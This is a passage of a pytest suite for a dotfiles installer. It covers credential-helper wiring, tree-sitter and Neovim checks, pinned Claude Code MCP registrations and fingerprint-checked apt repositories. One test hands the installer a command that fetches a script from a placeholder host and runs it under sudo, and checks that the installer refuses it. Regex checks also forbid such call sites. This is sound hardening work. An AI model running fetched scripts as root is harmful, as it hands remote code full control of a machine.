    """`gh auth git-credential` may only be wired where gh is installable.

    The tracked .gitconfig must not hard-code it for github.com and
    gist.github.com: install_gh only has an install path for macos and ubuntu,
    while detect_os also produces OS=linux (non-Debian) and OS=windows, where
    install_gh returns quietly -- so git would call a `gh` that was never
    installed on every HTTPS operation. The OS-dependent helper therefore
    lives in the rendered ~/.config/git/os.gitconfig, as osxkeychain does.
    """

    GH_HELPER = "!gh auth git-credential"

    def test_tracked_gitconfig_carries_no_gh_helper(self):
        """The OS-dependent helper must not be hard-coded in a linked file.

        Comment lines are stripped before the check on purpose: .gitconfig
        documents WHY the gh helper moved out, and that rationale necessarily
        quotes the helper string. Matching the raw text would fail on the
        explanation of the very fix it is guarding -- and the natural repair
        would be to delete the explanation.
        """
        text = (REPO_ROOT / ".gitconfig").read_text(encoding="utf-8")
        active = "\n".join(
            line for line in text.splitlines() if not line.lstrip().startswith("#")
        )
        assert self.GH_HELPER not in active, (
            ".gitconfig hard-codes the gh credential helper; it is linked on "
            "every OS, including the ones install_gh cannot install gh on"
        )

    @pytest.mark.parametrize("os_name", ["macos", "ubuntu"])
    def test_rendered_config_wires_gh_where_gh_is_installable(self, shell_env, os_name):
        res = run_sourced(f"OS={os_name} create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        for host in ("github.com", "gist.github.com"):
            key = f"credential.https://{host}.helper"
            # The empty first value is the reset that drops any helper
            # accumulated before it; dropping it would let a generic helper
            # answer for github.com ahead of gh.
            assert _git_config_all(rendered, key) == ["", self.GH_HELPER], (
                f"{key} in {rendered.read_text(encoding='utf-8')!r}"
            )

    @pytest.mark.parametrize("os_name", ["linux", "windows"])
    def test_rendered_config_omits_gh_where_gh_is_absent(self, shell_env, os_name):
        # gh must be genuinely absent, not merely unsupported: a developer
        # workstation has a real gh on PATH, and finding it is exactly what
        # the sibling test below asserts should wire the helper.
        #
        # Shadowing command_exists rather than stripping PATH, for the reason
        # _without_commands documents: it refuses to remove a protected system
        # directory and stops there. gh sits in /opt/homebrew/bin on the
        # author's Mac (strippable) but in /usr/bin on the GitHub ubuntu runner
        # (protected, so gh would stay visible and CI would fail on a green
        # local run). The shadow makes the two hosts run the same condition.
        res = run_sourced(
            'command_exists() { case "$1" in gh) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            f"OS={os_name} create_symlinks",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        assert self.GH_HELPER not in rendered.read_text(encoding="utf-8"), (
            f"OS={os_name} has no gh install path and no gh on PATH, so git "
            "must not be told to call gh"
        )

    @pytest.mark.parametrize("os_name", ["linux", "windows"])
    def test_rendered_config_wires_gh_when_it_is_already_installed(
        self, shell_env, os_name
    ):
        """An OS install_gh cannot serve may still have gh from elsewhere.

        Arch and Fedora ship gh in their own repositories, and Git Bash users
        get it from winget/scoop; detect_os calls both `linux`/`windows`.
        Gating the credential helper purely on the OS name would take the
        helper away from those users and drop them back to the generic cache
        helper, re-prompting on every HTTPS operation.
        """
        shell_env.stub("gh")
        res = run_sourced(f"OS={os_name} create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        assert self.GH_HELPER in rendered.read_text(encoding="utf-8"), (
            f"gh is installed on OS={os_name}, so the helper must be wired"
        )

    def test_generic_helper_still_follows_the_github_block(self, shell_env):
        """Order is behaviour: the reset must not swallow the generic helper.

        The github block comes first and the generic helper arrives later via
        [include], so git's helper list for a github URL is [gh, <generic>] --
        gh first, the OS keychain/cache behind it. Emitting the github block
        after the generic one instead would put the `helper =` reset after it
        and leave [gh] alone.
        """
        res = run_sourced("OS=macos create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        text = rendered.read_text(encoding="utf-8")
        assert text.index('[credential "https://github.com"]') < text.index(
            "\n[credential]"
        ), text
        assert _git_config_all(rendered, "credential.helper") == ["osxkeychain"], text


# nvim-treesitter's main branch builds every parser with the tree-sitter CLI,
# needs 0.26.1 or later, and its README rejects the npm package (npm's install
# script fetches the real binary; when that step is blocked, a shim that cannot
# run is left on PATH and `command -v` still finds it).
_TS_ABSENT = (
    'command_exists() { case "$1" in tree-sitter) return 1 ;; '
    '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
)


class TestInstallTreeSitterCli:
    @pytest.mark.parametrize(
        ("have", "want", "expected"),
        [
            ("0.26.1", "0.26.1", True),
            ("0.27.1", "0.26.1", True),
            ("1.0.0", "0.26.1", True),
            ("0.26.10", "0.26.9", True),
            ("0.26.0", "0.26.1", False),
            ("0.25.9", "0.26.1", False),
            ("0.9.99", "0.26.1", False),
        ],
    )
    def test_version_at_least(self, shell_env, have, want, expected):
        res = run_sourced(
            f'if version_at_least "{have}" "{want}"; then echo YES; else echo NO; fi',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert res.stdout.strip().splitlines()[-1] == ("YES" if expected else "NO")

    def test_macos_installs_with_brew_not_npm(self, shell_env):
        res = run_sourced(
            _TS_ABSENT + "OS=macos install_tree_sitter_cli", shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "brew install tree-sitter-cli" in shell_env.calls
        assert not any(c.startswith("npm ") for c in shell_env.calls)

    def test_a_recent_cli_is_left_alone(self, shell_env):
        shell_env.stub("tree-sitter", body='echo "tree-sitter 0.27.1 (abc123)"')
        res = run_sourced("OS=macos install_tree_sitter_cli", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "already installed" in res.stdout
        assert not any(c.startswith(("brew ", "npm ")) for c in shell_env.calls)

    def test_an_outdated_cli_is_replaced(self, shell_env):
        shell_env.stub("tree-sitter", body='echo "tree-sitter 0.25.3 (abc123)"')
        res = run_sourced("OS=macos install_tree_sitter_cli", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "0.25.3" in res.stdout and "0.26.1" in res.stdout
        assert "brew install tree-sitter-cli" in shell_env.calls

    def test_a_cli_that_cannot_run_is_not_trusted(self, shell_env):
        # The npm shim left behind when its binary download was blocked.
        shell_env.stub(
            "tree-sitter",
            body='echo "Error: ENOENT: no such file or directory" >&2',
            exit_code=1,
        )
        res = run_sourced("OS=macos install_tree_sitter_cli", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "already installed" not in res.stdout
        assert "npm uninstall -g tree-sitter-cli" in res.stdout
        assert "brew install tree-sitter-cli" in shell_env.calls

    def test_a_cli_still_shadowed_after_install_is_reported(self, shell_env):
        # brew succeeded, but the broken npm shim comes first on PATH: the check
        # after installing still finds no runnable CLI, and must say so rather
        # than finish silently.
        shell_env.stub("tree-sitter", body="exit 1", exit_code=1)
        res = run_sourced("OS=macos install_tree_sitter_cli", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "brew install tree-sitter-cli" in shell_env.calls
        tail = res.stdout.split("Installing tree-sitter CLI", 1)[1]
        assert "still" in tail and "PATH" in tail, res.stdout

    def test_ubuntu_builds_it_with_cargo(self, shell_env):
        shell_env.stub("cargo")
        res = run_sourced(
            _TS_ABSENT + "OS=ubuntu install_tree_sitter_cli", shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "cargo install --locked tree-sitter-cli" in shell_env.calls
        assert not any(c.startswith("npm ") for c in shell_env.calls)

    def test_ubuntu_without_cargo_explains_instead_of_using_npm(self, shell_env):
        shell_env.hide("cargo")
        res = run_sourced(
            _TS_ABSENT + "OS=ubuntu install_tree_sitter_cli", shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "cargo not found" in res.stdout
        assert "tree-sitter/releases" in res.stdout
        assert not any(c.startswith("npm ") for c in shell_env.calls)


# This config targets Neovim 0.12+ (INSTALL_PLATFORM.md), but apt's `neovim` on
# the current Ubuntu LTS releases is older, so install_apt_packages can finish
# "successfully" with an editor the config cannot run on. The check after the
# APT step says so. It is a WARNING and never a recorded failure: apt cannot
# provide the version, so recording it would make every run on a stock Ubuntu
# LTS exit 1 no matter what the user did.
_NVIM_DOC_ANCHOR = "INSTALL_PLATFORM.md#neovimのバージョンが古い"


class TestNeovimVersionCheck:
    @staticmethod
    def _nvim(shell_env, first_line):
        # `nvim --version` prints more than one line; only the first carries
        # the version, so the stub proves the check does not read past it.
        shell_env.stub(
            "nvim", body=f"echo {shlex.quote(first_line)}\necho 'Build type: Release'"
        )

    @staticmethod
    def _run(shell_env, snippet="check_neovim_version"):
        # run_recording fails loudly if the snippet aborted under `set -e`,
        # and hands back INSTALL_FAILURES: [] is what "warning only" means.
        return run_recording(f'{snippet}; echo "AFTER_CHECK"', shell_env.env)

    @pytest.mark.parametrize(
        "line",
        [
            "NVIM v0.9.5",  # Ubuntu 24.04 LTS apt
            "NVIM v0.11.9",  # the boundary: one minor below
            "NVIM v0.11.0-dev-1234+gabcdef0",  # a nightly BEFORE 0.12
            "NVIM v0.4.3",
        ],
    )
    def test_an_older_nvim_warns_and_points_at_the_upgrade_steps(self, shell_env, line):
        self._nvim(shell_env, line)

        res, labels = self._run(shell_env)

        assert res.returncode == 0, res.stderr
        warning = [ln for ln in res.stdout.splitlines() if "[WARNING]" in ln]
        assert len(warning) == 1, res.stdout
        assert "0.12" in warning[0], warning
        assert line.split("v", 1)[1] in warning[0], warning
        assert _NVIM_DOC_ANCHOR in warning[0], warning
        assert labels == [], "an old nvim must not be recorded as a failed step"
        assert "AFTER_CHECK" in res.stdout

    @pytest.mark.parametrize(
        "line",
        [
            "NVIM v0.12.0",  # the boundary itself
            "NVIM v0.12.4",
            "NVIM v0.12.0-dev-1234+gabcdef0",  # a 0.12 nightly counts as 0.12
            "NVIM v0.13.1",
            "NVIM v0.100.0",  # numeric, not lexicographic
            "NVIM v1.0.0",
        ],
    )
    def test_a_new_enough_nvim_is_accepted_quietly(self, shell_env, line):
        self._nvim(shell_env, line)

        res, labels = self._run(shell_env)

        assert res.returncode == 0, res.stderr
        assert "[WARNING]" not in res.stdout, res.stdout
        assert labels == []
        assert "AFTER_CHECK" in res.stdout

    def test_a_missing_nvim_warns_and_continues(self, shell_env):
        # A stub cannot express absence, and a developer machine has a real
        # nvim on PATH: hide() makes it genuinely absent.
        shell_env.hide("nvim")

        res, labels = self._run(shell_env)

        assert res.returncode == 0, res.stderr
        warning = [ln for ln in res.stdout.splitlines() if "[WARNING]" in ln]
        assert len(warning) == 1, res.stdout
        assert "nvim" in warning[0] and _NVIM_DOC_ANCHOR in warning[0], warning
        assert labels == []
        assert "AFTER_CHECK" in res.stdout

    @pytest.mark.parametrize(
        ("body", "exit_code"),
        [
            ("echo 'something that is not a version banner'", 0),
            ("", 0),  # prints nothing at all
            ("echo 'nvim: error while loading shared libraries' >&2", 127),
            ("echo 'NVIM vNEXT'", 0),  # a `v` and no digits
        ],
    )
    def test_a_version_that_cannot_be_read_warns_and_never_aborts(
        self, shell_env, body, exit_code
    ):
        shell_env.stub("nvim", body=body, exit_code=exit_code)

        res, labels = self._run(shell_env)

        assert res.returncode == 0, res.stderr
        warning = [ln for ln in res.stdout.splitlines() if "[WARNING]" in ln]
        assert len(warning) == 1, res.stdout
        assert _NVIM_DOC_ANCHOR in warning[0], warning
        # Unparseable is NOT "older than 0.12": garbage must not be reported
        # as a version it never claimed to be.
        assert "older than" not in warning[0], warning
        assert labels == []
        assert "AFTER_CHECK" in res.stdout

    def test_the_apt_step_runs_the_check(self, shell_env):
        # The wiring: the check exists so that the APT step cannot report a
        # clean install of an editor the config cannot run on.
        self._nvim(shell_env, "NVIM v0.9.5")

        res, labels = self._run(shell_env, snippet="install_apt_packages")

        assert res.returncode == 0, res.stdout + res.stderr
        assert any(
            "[WARNING]" in ln and _NVIM_DOC_ANCHOR in ln
            for ln in res.stdout.splitlines()
        ), res.stdout
        assert "APT packages installed" in res.stdout
        assert labels == []
        assert "AFTER_CHECK" in res.stdout

    def test_the_apt_step_is_quiet_about_a_current_nvim(self, shell_env):
        self._nvim(shell_env, "NVIM v0.12.4")

        res, labels = self._run(shell_env, snippet="install_apt_packages")

        assert res.returncode == 0, res.stdout + res.stderr
        assert _NVIM_DOC_ANCHOR not in res.stdout
        assert labels == []


# =============================================================================
# Pinned installs, signed apt repositories, idempotent reruns and the Docker steps
# =============================================================================


_USER_SCOPE = "User config (available in all your projects)"


def _claude_stub(registered=None, *, remove_exit=0, add_exit=0) -> str:
    """Body for a `claude` stub.

    `claude mcp get NAME` prints NAME's registration in the shape the real CLI
    prints it (`  Scope: ...`, `  Type: ...`, `  Command: ...`, `  Args: ...`,
    space-joined) or exits 1 when NAME is not registered.
    """
    lines = ['if [ "$1 $2" = "mcp get" ]; then', '  case "$3" in']
    for name, reg in (registered or {}).items():
        out = [
            f"{name}:",
            f"  Scope: {reg.get('scope', _USER_SCOPE)}",
            "  Status: Connected",
            f"  Type: {reg.get('type', 'stdio')}",
        ]
        if "command" in reg:
            out.append(f"  Command: {reg['command']}")
        if "args" in reg:
            out.append(f"  Args: {reg['args']}")
        out += [
            "  Environment:",
            "",
            f"To remove this server, run: claude mcp remove {name} -s user",
        ]
        quoted = " ".join(shlex.quote(x) for x in out)
        lines.append(f"  {shlex.quote(name)}) printf '%s\\n' {quoted}; exit 0 ;;")
    lines += [
        "  esac",
        "  exit 1",
        "fi",
        f'[ "$1 $2" = "mcp remove" ] && exit {remove_exit}',
        f'[ "$1 $2" = "mcp add" ] && exit {add_exit}',
        "exit 0",
    ]
    return "\n".join(lines)


def _expected_mcp(home: Path, python: str) -> dict:
    """name -> (command, space-joined args) that install.sh registers."""
    return {
        "context7": ("npx", f"-y @upstash/context7-mcp@{_pin('CONTEXT7_MCP_VERSION')}"),
        "serena": (
            "uvx",
            f"--from git+https://github.com/oraios/serena@{_pin('SERENA_REF')} "
            "serena start-mcp-server --context claude-code",
        ),
        "gemini-consultant": (
            python,
            f"{home}/.claude/mcp-servers/gemini-consultant/server.py",
        ),
    }


def _registered(home: Path, python: str, **overrides) -> dict:
    """Every server registered exactly as install.sh would, with `overrides`."""
    reg = {
        name: {"command": cmd, "args": args}
        for name, (cmd, args) in _expected_mcp(home, python).items()
    }
    for name, fields in overrides.items():
        name = name.replace("_", "-")
        if fields is None:
            reg.pop(name, None)
        else:
            reg[name] = {**reg.get(name, {}), **fields}
    return reg


class TestPinnedMcpServers:
    """The MCP servers Claude Code starts every session run a pinned build."""

    def test_the_pins_are_exact(self):
        assert re.fullmatch(r"[0-9a-f]{40}", _pin("SERENA_REF"))
        assert re.fullmatch(r"\d+\.\d+\.\d+", _pin("CONTEXT7_MCP_VERSION"))
        # mcp 2.x no longer ships mcp.server.fastmcp, which server.py imports.
        assert re.fullmatch(r"1\.\d+\.\d+", _pin("MCP_PY_VERSION"))

    def test_a_fresh_registration_uses_the_pins(self, shell_env):
        shell_env.stub("claude", body=_claude_stub())
        real = shell_env.stub("python3.13-real")
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')

        res, failures = run_recording("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []

        adds = [c for c in shell_env.calls if c.startswith("claude mcp add")]
        for name, (cmd, args) in _expected_mcp(shell_env.home, str(real)).items():
            assert f"claude mcp add --scope user {name} -- {cmd} {args}" in adds, adds

    def test_the_mcp_package_is_installed_at_the_pin(self, shell_env):
        shell_env.stub("pip3", body='[ "$1" = show ] && exit 1\nexit 0')
        res, failures = run_recording("install_mcp_server_deps", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert f"pip3 install --user mcp=={_pin('MCP_PY_VERSION')}" in shell_env.calls
        assert failures == []

    def test_no_unpinned_spelling_is_left(self):
        code = _executable_lines(INSTALL.read_text(encoding="utf-8"))
        assert not re.search(r"oraios/serena(?!@)", code)
        assert not re.search(r"@upstash/context7-mcp(?!@)", code)
        assert not re.search(r"pip_install_user \"\$pip_cmd\" mcp\b(?!=)", code)
        # The legacy context name serena now only maps to claude-code.
        assert "ide-assistant" not in code


class TestMcpRegistrationConverges:
    """An existing registration is compared to the expected command and args
    exactly, and re-registered when it differs; one that cannot be fixed is a
    recorded failure, never a warning followed by "completed"."""

    def _python(self, shell_env, *, imports_mcp=True):
        body = "" if imports_mcp else 'case "$2" in *"import mcp"*) exit 1 ;; esac'
        real = shell_env.stub("python3.13-real", body=body)
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')
        return str(real)

    def _run(self, shell_env, registered, prefix="", **stub_kw):
        shell_env.stub("claude", body=_claude_stub(registered, **stub_kw))
        res, failures = run_recording(
            prefix + "register_claude_mcp_servers", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        mutations = [
            c for c in shell_env.calls if re.match(r"claude mcp (add|remove) ", c)
        ]
        return res, failures, mutations

    def test_a_matching_registration_is_left_alone(self, shell_env):
        real = self._python(shell_env)
        res, failures, mutations = self._run(
            shell_env, _registered(shell_env.home, real)
        )
        assert mutations == []
        assert failures == []
        assert res.stdout.count("already registered") == 3, res.stdout

    def test_a_stale_interpreter_is_re_registered(self, shell_env):
        # The real machine: `Command: python`, an old pyenv shim.
        real = self._python(shell_env)
        res, failures, mutations = self._run(
            shell_env,
            _registered(shell_env.home, real, gemini_consultant={"command": "python"}),
        )
        server = f"{shell_env.home}/.claude/mcp-servers/gemini-consultant/server.py"
        assert mutations == [
            "claude mcp remove --scope user gemini-consultant",
            f"claude mcp add --scope user gemini-consultant -- {real} {server}",
        ]
        assert failures == []

    def test_a_command_that_merely_contains_the_expected_one_is_a_mismatch(
        self, shell_env
    ):
        # `*"$python_cmd"*` used to accept /usr/bin/python3.9 for /usr/bin/python3.
        real = self._python(shell_env)
        _, _, mutations = self._run(
            shell_env,
            _registered(
                shell_env.home, real, gemini_consultant={"command": real + ".9"}
            ),
        )
        assert "claude mcp remove --scope user gemini-consultant" in mutations

    def test_an_unpinned_serena_is_re_registered_at_the_pin(self, shell_env):
        real = self._python(shell_env)
        old = (
            "--from git+https://github.com/oraios/serena serena start-mcp-server "
            "--context ide-assistant"
        )
        _, failures, mutations = self._run(
            shell_env, _registered(shell_env.home, real, serena={"args": old})
        )
        cmd, args = _expected_mcp(shell_env.home, real)["serena"]
        assert mutations == [
            "claude mcp remove --scope user serena",
            f"claude mcp add --scope user serena -- {cmd} {args}",
        ]
        assert failures == []

    def test_a_re_registration_that_fails_is_recorded(self, shell_env):
        real = self._python(shell_env)
        res, failures, _ = self._run(
            shell_env,
            _registered(shell_env.home, real, gemini_consultant={"command": "python"}),
            remove_exit=1,
        )
        assert failures == ["MCP server gemini-consultant"]
        assert "claude mcp remove --scope user gemini-consultant" in res.stdout

    # What a user may have added to a registration: an --api-key argument.
    SECRET = "sk-SECRET-1234"

    def _with_user_args(self, shell_env, real):
        return _registered(
            shell_env.home,
            real,
            context7={
                "args": f"-y @upstash/context7-mcp@0.0.1 --api-key {self.SECRET}"
            },
        )

    def test_the_old_registration_is_saved_owner_only_before_it_is_removed(
        self, shell_env
    ):
        real = self._python(shell_env)
        backup = shell_env.home / "bk"
        # remove exits 9 unless the saved copy is already in place: a save
        # that came after the remove would leave nothing to restore from.
        shell_env.stub(
            "claude",
            body=(
                '[ "$1 $2" = "mcp remove" ] && { [ -s "$HOME/bk/mcp-$5.txt" ] || exit 9; }\n'
                + _claude_stub(self._with_user_args(shell_env, real))
            ),
        )
        res, failures = run_recording(
            'backup_dir="$HOME/bk"; register_claude_mcp_servers', shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == [], res.stdout
        saved = backup / "mcp-context7.txt"
        text = saved.read_text(encoding="utf-8")
        assert self.SECRET in text and "Command: npx" in text
        assert stat.S_IMODE(saved.stat().st_mode) == 0o600
        # The terminal gets the path, never the old arguments.
        assert str(saved) in res.stdout
        assert self.SECRET not in res.stdout + res.stderr
        assert [c for c in shell_env.calls if c.startswith("claude mcp remove")] == [
            "claude mcp remove --scope user context7"
        ]

    def test_without_a_backup_dir_the_save_still_lands_under_home(self, shell_env):
        # register_claude_mcp_servers is also run on its own, with no
        # create_symlinks before it: backup_dir is then unset.
        real = self._python(shell_env)
        res, failures, _ = self._run(shell_env, self._with_user_args(shell_env, real))
        assert failures == [], res.stdout
        (saved,) = shell_env.home.glob(".dotfiles_backup_*/mcp-context7.txt")
        assert self.SECRET in saved.read_text(encoding="utf-8")
        assert self.SECRET not in res.stdout + res.stderr

    def test_an_add_that_fails_after_the_remove_names_the_saved_copy(self, shell_env):
        real = self._python(shell_env)
        res, failures, mutations = self._run(
            shell_env,
            self._with_user_args(shell_env, real),
            prefix='backup_dir="$HOME/bk"; ',
            add_exit=1,
        )
        assert failures == ["MCP server context7"]
        assert mutations[0] == "claude mcp remove --scope user context7"
        assert f"{shell_env.home}/bk/mcp-context7.txt" in res.stdout
        # The server is gone at this point: say so rather than "re-registered".
        assert "NOT registered" in res.stdout
        assert "Re-registered MCP server" not in res.stdout
        assert self.SECRET not in res.stdout + res.stderr

    def test_a_registration_that_cannot_be_saved_is_not_removed(self, shell_env):
        real = self._python(shell_env)
        (shell_env.home / "blocker").write_text("a file, not a directory\n")
        res, failures, mutations = self._run(
            shell_env,
            self._with_user_args(shell_env, real),
            prefix='backup_dir="$HOME/blocker/bk"; ',
        )
        # Nothing was recorded, so nothing may be deleted.
        assert mutations == []
        assert failures == ["MCP server context7"]
        assert "leaving it as it is" in res.stdout
        assert self.SECRET not in res.stdout + res.stderr

    def test_the_other_scope_warning_does_not_print_the_arguments(self, shell_env):
        real = self._python(shell_env)
        reg = _registered(
            shell_env.home,
            real,
            context7={
                "args": f"-y x --api-key {self.SECRET}",
                "scope": "Local config (private to you in this project)",
            },
        )
        res, failures, mutations = self._run(shell_env, reg)
        assert mutations == []
        assert failures == ["MCP server context7"]
        assert "Local config" in res.stdout
        assert self.SECRET not in res.stdout + res.stderr

    def test_a_registration_in_another_scope_is_reported_not_removed(self, shell_env):
        real = self._python(shell_env)
        res, failures, mutations = self._run(
            shell_env,
            _registered(
                shell_env.home,
                real,
                gemini_consultant={
                    "command": "python",
                    "scope": "Local config (private to you in this project)",
                },
            ),
        )
        assert mutations == []
        assert failures == ["MCP server gemini-consultant"]
        assert "Local config" in res.stdout

    def test_a_remote_registration_is_left_alone(self, shell_env):
        real = self._python(shell_env)
        reg = _registered(shell_env.home, real)
        reg["context7"] = {"type": "http"}
        res, failures, mutations = self._run(shell_env, reg)
        assert mutations == []
        assert failures == []
        assert "context7" in res.stdout and "http" in res.stdout

    def test_mcp_is_checked_on_the_interpreter_now_registered(self, shell_env):
        # The registration converges on this interpreter, so whether IT can
        # import mcp is what decides whether the server starts.
        real = self._python(shell_env, imports_mcp=False)
        res, failures, _ = self._run(
            shell_env,
            _registered(shell_env.home, real, gemini_consultant={"command": "python"}),
        )
        assert failures == ["gemini-consultant (mcp not importable)"], res.stdout


class TestFetchAndRunNeverRunsAsRoot:
    """Nothing fetched over the network is executed under sudo."""

    @pytest.mark.parametrize("sudo", ["sudo", "/usr/bin/sudo"])
    def test_a_sudo_interpreter_is_refused_before_downloading(self, shell_env, sudo):
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced(
            f"fetch_and_run https://example.test/x.sh {sudo} sh "
            '&& echo OK || echo "FAILED rc=$?"',
            shell_env.env,
        )
        assert "FAILED rc=1" in res.stdout, res.stdout
        assert "Refusing" in res.stdout
        assert not [c for c in shell_env.calls if c.startswith(("curl", "sudo"))]

    def test_no_call_site_runs_a_fetched_script_as_root(self):
        code = _executable_lines(INSTALL.read_text(encoding="utf-8"))
        assert not re.search(r"fetch_and_run\s+\S+\s+(\S*/)?sudo\b", code)
        assert "sudo -E" not in code
        assert "get.docker.com" not in code
        assert "setup_lts" not in code


class TestSignedAptRepos:
    """Docker Engine and Node.js come from their signed apt repositories,
    each keyring checked against a pinned fingerprint after root wrote it."""

    REPO = (
        "_add_signed_apt_repo Demo https://example.test/key "
        "/etc/apt/keyrings/demo.gpg {fpr} demo.list "
        '"deb [signed-by=/etc/apt/keyrings/demo.gpg] https://example.test stable main"'
        ' && echo ADDED || echo "NOT_ADDED rc=$?"'
    )

    def _tee_log(self, shell_env) -> str:
        log = shell_env.home / "tee.log"
        return log.read_text(encoding="utf-8") if log.exists() else ""

    def test_a_matching_key_adds_the_repository(self, shell_env):
        fpr = _pin("DOCKER_APT_KEY_FPR")
        shell_env.stub("curl")
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        shell_env.stub("gpg", body=_gpg_shows(fpr))
        res, failures = run_recording(self.REPO.format(fpr=fpr), shell_env.env)
        assert "ADDED" in res.stdout and "NOT_ADDED" not in res.stdout, res.stdout
        assert failures == []
        log = self._tee_log(shell_env)
        assert "## tee /etc/apt/sources.list.d/demo.list\n" in log
        assert (
            "deb [signed-by=/etc/apt/keyrings/demo.gpg] https://example.test stable main"
            in log
        )
        # The key root wrote (staged beside the keyring) is what gets checked,
        # not a user-owned copy; only a match is renamed into place.
        staged = "/etc/apt/keyrings/demo.gpg.new"
        assert f"sudo gpg --batch --yes --dearmor -o {staged}" in shell_env.calls
        checks = [
            i
            for i, c in enumerate(shell_env.calls)
            if c.startswith("gpg ") and "--show-keys" in c and c.endswith(f" {staged}")
        ]
        assert checks, shell_env.calls
        moved = shell_env.calls.index(f"sudo mv -f {staged} /etc/apt/keyrings/demo.gpg")
        assert checks[0] < moved
        # ... and it is made world-readable BEFORE it is checked: the check runs
        # as the invoking user, and root's file is 0600 under a strict umask.
        readable = shell_env.calls.index(f"sudo chmod 0644 {staged}")
        assert readable < checks[0]

    def _strict_umask_root(self, shell_env):
        """Root's staged file is unreadable to the user's gpg until it is
        chmod'ed: the gpg stub fails (exit 2) unless `sudo chmod 0644` ran."""
        shell_env.stub(
            "sudo",
            body=_SUDO_TEE_LOG
            + 'case "$*" in "chmod 0644 "*) touch "$HOME/staged-readable" ;; esac\n',
        )
        return '[ -e "$HOME/staged-readable" ] || exit 2\n' + _gpg_shows(
            _pin("DOCKER_APT_KEY_FPR")
        )

    def test_a_key_only_root_could_read_still_gets_checked(self, shell_env):
        fpr = _pin("DOCKER_APT_KEY_FPR")
        shell_env.stub("curl")
        shell_env.stub("gpg", body=self._strict_umask_root(shell_env))
        res, failures = run_recording(self.REPO.format(fpr=fpr), shell_env.env)
        assert "ADDED" in res.stdout and "NOT_ADDED" not in res.stdout, res.stdout
        assert failures == []

    def test_a_key_gpg_cannot_read_is_not_called_a_fingerprint_mismatch(
        self, shell_env
    ):
        shell_env.stub("curl")
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        shell_env.stub("gpg", exit_code=2)
        res = run_sourced(self.REPO.format(fpr=_OTHER_FPR), shell_env.env)
        assert re.search(r"^NOT_ADDED rc=1$", res.stdout, re.M), res.stdout
        assert "Could not read the Demo signing key" in res.stdout
        assert "does not match" not in res.stdout
        assert "got: none" not in res.stdout
        assert "sudo rm -f /etc/apt/keyrings/demo.gpg.new" in shell_env.calls
        assert not [c for c in shell_env.calls if c.startswith("sudo mv")]
        assert "sources.list.d" not in self._tee_log(shell_env)

    def test_a_chmod_that_fails_discards_the_key_and_adds_nothing(self, shell_env):
        shell_env.stub("curl")
        shell_env.stub(
            "sudo", body=_SUDO_TEE_LOG + 'case "$*" in "chmod "*) exit 1 ;; esac\n'
        )
        shell_env.stub("gpg", body=_gpg_shows(_pin("DOCKER_APT_KEY_FPR")))
        res = run_sourced(
            self.REPO.format(fpr=_pin("DOCKER_APT_KEY_FPR")), shell_env.env
        )
        assert re.search(r"^NOT_ADDED rc=1$", res.stdout, re.M), res.stdout
        assert "sudo rm -f /etc/apt/keyrings/demo.gpg.new" in shell_env.calls
        assert not [c for c in shell_env.calls if c.startswith("sudo mv")]
        assert "sources.list.d" not in self._tee_log(shell_env)

    def test_without_gpg_nothing_is_fetched_and_the_cause_is_named(self, shell_env):
        # A minimal image has no gpg; the get.docker.com / setup_lts.x scripts
        # used to install their own prerequisites, so this must not surface as
        # an unrelated "failed to fetch" or "got: none".
        shell_env.stub("curl")
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        res = run_sourced(
            _absent("gpg") + self.REPO.format(fpr=_OTHER_FPR), shell_env.env
        )
        assert re.search(r"^NOT_ADDED rc=1$", res.stdout, re.M), res.stdout
        assert "gpg is not installed" in res.stdout and "gnupg" in res.stdout
        assert not [c for c in shell_env.calls if c.startswith(("curl", "sudo"))]

    def test_the_apt_package_list_carries_gpg_and_the_ca_bundle(self, shell_env):
        # Both used to come in with the vendor scripts the signed repositories
        # replaced; curl -fsSL of an https key needs ca-certificates too.
        res = run_sourced("OS=ubuntu install_apt_packages", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        (install,) = [
            c for c in shell_env.calls if c.startswith("sudo apt-get install -y git ")
        ]
        assert " gnupg " in f"{install} " and " ca-certificates " in f"{install} "

    @pytest.mark.parametrize(
        "shown",
        [(_OTHER_FPR,), ("{fpr}", _OTHER_FPR), ()],
        ids=["another-key", "an-extra-key", "no-key"],
    )
    def test_any_other_keyring_is_removed_and_no_source_is_written(
        self, shell_env, shown
    ):
        fpr = _pin("DOCKER_APT_KEY_FPR")
        shell_env.stub("curl")
        shell_env.stub("sudo", body=_SUDO_TEE_LOG)
        shell_env.stub("gpg", body=_gpg_shows(*(s.format(fpr=fpr) for s in shown)))
        res = run_sourced(self.REPO.format(fpr=fpr), shell_env.env)
        assert re.search(r"^NOT_ADDED rc=1$", res.stdout, re.M), res.stdout
        assert "fingerprint" in res.stdout
        # The rejected key is discarded; an existing keyring is never touched.
        assert "sudo rm -f /etc/apt/keyrings/demo.gpg.new" in shell_env.calls
        assert not [
            c
            for c in shell_env.calls
